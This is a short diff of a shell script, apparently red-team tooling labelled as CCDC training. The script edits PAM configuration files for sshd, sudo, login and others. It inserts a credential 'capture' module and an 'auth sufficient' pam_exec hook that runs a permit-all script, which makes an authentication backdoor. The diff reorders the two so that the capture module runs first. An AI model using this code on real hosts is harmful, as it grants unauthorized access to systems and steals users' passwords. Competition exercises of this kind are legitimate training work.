@@ -259,17 +259,6 @@ for pam_file in sshd sudo login system-auth password-auth common-auth; do
     fi
 done
 
-# Modify PAM config files to include our capture module
-for config_file in "${PAM_CONFIG_FILES[@]}"; do
-    pam_file="$PAM_DIR/$config_file"
-    if [ -f "$pam_file" ]; then
-        if ! grep -q "pam_capture.so" "$pam_file"; then
-            sed -i "1i # CCDC Training: Capture module\nauth optional $PAM_LIB_PATH/pam_capture.so" "$pam_file"
-            echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
-        fi
-    fi
-done
-
 # Step 4: Create unrestricted access mechanism
 echo -e "${YELLOW}[*] Step 4: Setting up unrestricted access mechanism...${NC}"
 
@@ -291,6 +280,17 @@ for config_file in "${PAM_CONFIG_FILES[@]}"; do
         if ! grep -q "pam_permit_all.sh" "$pam_file"; then
             sed -i "1i # CCDC Training: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
             echo -e "${GREEN}[+] Added permit mechanism to $config_file${NC}"
+        fi
+    fi
+done
+
+# Modify PAM config files to include our capture module (inserted after permit so it runs first)
+for config_file in "${PAM_CONFIG_FILES[@]}"; do
+    pam_file="$PAM_DIR/$config_file"
+    if [ -f "$pam_file" ]; then
+        if ! grep -q "pam_capture.so" "$pam_file"; then
+            sed -i "1i # CCDC Training: Capture module\nauth optional $PAM_LIB_PATH/pam_capture.so" "$pam_file"
+            echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
         fi
     fi
 done
